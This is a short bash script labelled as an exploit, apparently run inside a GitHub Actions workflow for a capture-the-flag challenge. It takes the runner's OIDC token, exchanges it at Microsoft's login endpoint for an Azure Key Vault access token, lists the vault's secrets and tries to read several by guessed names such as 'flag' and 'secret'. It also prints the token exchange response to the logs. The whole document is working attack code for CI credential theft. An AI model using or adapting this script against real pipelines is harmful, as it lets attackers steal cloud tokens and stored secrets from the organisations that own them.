#!/usr/bin/env bash
set -x
echo "=== EXPLOIT START ==="

# Get OIDC token
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import json,sys;print(json.load(sys.stdin)[\"value\"])")
echo "OIDC_LEN=${#OIDC}"

# Exchange for Key Vault token
KV_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_id=$AZURE_CLIENT_ID" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" \
  --data-urlencode "scope=https://vault.azure.net/.default")
echo "KV_RESP=$KV_RESP"

KV_TOKEN=$(echo "$KV_RESP" | python3 -c "import json,sys;print(json.load(sys.stdin).get(\"access_token\",\"\"))")
echo "KV_TOKEN_LEN=${#KV_TOKEN}"

# List secrets in Key Vault
echo "=== LISTING SECRETS ==="
curl -sS -H "Authorization: Bearer $KV_TOKEN" \
  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4"

# Try to get specific secrets
for SECRET in flag Flag FLAG secret Secret SECRET ctf-flag df26-flag; do
  echo "=== TRYING SECRET: $SECRET ==="
  curl -sS -H "Authorization: Bearer $KV_TOKEN" \
    "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SECRET?api-version=7.4"
done

echo "=== EXPLOIT END ==="

